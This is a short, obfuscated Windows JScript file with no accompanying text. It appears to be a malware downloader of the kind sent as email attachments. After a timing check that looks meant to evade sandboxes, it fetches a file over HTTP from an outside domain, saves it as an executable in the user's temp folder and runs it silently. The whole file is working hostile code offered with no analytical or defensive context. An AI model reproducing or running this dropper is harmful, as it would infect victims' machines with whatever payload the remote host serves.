var PO = false;
var sn = "CreateObject";
var Hg = function vp() {return WScript[sn]("WScript.Shell");}(), O = 11;
var IC = "MSXML2.XMLHTTP";
var o = 2123213;
var VL = 0;
function l(t){Hg["Run"](t, VL, VL);};
function z0(){return "" + IC;};
function oZ(sh, E){VL = VL * 1; return sh - E;};
function X(){return sn;};
/*@cc_on
  @if (@_win32 || @_win64)
    PO = true;
  @end
@*/
if (PO)
{
var u = "";
function jR(){return 22;};
var dg = 0; var Bz = 0;
function z()
{
var d = new this["Date"]();
var oj = d["getUTCMilliseconds"]();
WScript["Sleep"](jR());
var d = new this["Date"]();
var hl = d["getUTCMilliseconds"]();
WScript["Sleep"](jR());
var d = new this["Date"]();
var r = d["getUTCMilliseconds"]();
var dg = "W";
dg = oZ(hl, oj);
var Bz = "Ng";
Bz = oZ(r, hl);
u = "open";
return oZ(dg, Bz);
}
var yS = false;
var aq = false;
for (var kL = VL; kL < jR() * 1; kL++){if (z() != VL){
yS = true; 
Bz = "31" + 11 * dg + Bz; 
aq = true; 
break;
}}
function V() {return ((yS == true) && (yS == aq)) ? 1 : VL;};
if (yS && V() && aq){
function h() {return Hg["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "SDXZnWByOWk.exe";};
 d0 = z0();
 wH = WScript[sn](d0);
 var wP = 1;
 while (wP){
try {
wH[u]("GET", "http://refindsexy.com/i8eps", false);
wH["send"]();
G0 = "Sleep";
for (;;){WScript[G0](jR() * 11); if (wH["readystate"] >= 2 * 2) break;};
wP = VL;
} catch(Bt){};
}
function G(X0) {var Y = (1, 2, 3, 4, 5, X0); return Y;};
fK = WScript[X()]("ADODB.Stream");
d0 = fK;
d0[u]();
d0["type"] = G(1);
d0["write"](wH["ResponseBody"]);
fK["position"] = G(VL);
d0["Save" + "ToFile"](h(), 2);
fK["c"+"lose"]();
uO = h();
l(uO);
}
}

